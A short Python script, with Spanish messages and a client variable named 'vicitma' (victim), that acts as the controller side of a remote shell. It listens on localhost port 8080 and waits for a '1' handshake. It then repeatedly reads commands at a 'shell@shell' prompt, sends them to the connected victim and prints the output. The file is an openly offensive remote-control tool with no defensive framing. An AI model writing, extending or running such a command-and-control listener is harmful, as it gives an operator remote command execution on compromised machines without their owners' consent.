import socket

def conecctionserver():
    server = socket.socket()
    server.bind(('localhost', 8080))
    server.listen(1)
    print("esperando conexion: ")

    while True:
        vicitma, direccion= server.accept()
        print(f'Conneccion de: {direccion}')
        print(f'Conneccion de: {vicitma}')
        msjbinario=vicitma.recv(1024)
        print(msjbinario)
        msjCodificado=msjbinario.decode("ascii")
        socket.timeout(2)

        if msjCodificado == "1":
            while True:
                opcion = input("shell@shell: ")
                vicitma.send(opcion.encode("ascii"))
                resultado = vicitma.recv(1024)
                print(f'esto llego: {resultado}')
        else:
            print("Error mierda")
            break

def main():
    conecctionserver()

if __name__== '__main__':

    try:
        
        main()

    except KeyboardInterrupt:
            print('El programa ha sido cancelado por el usuario')
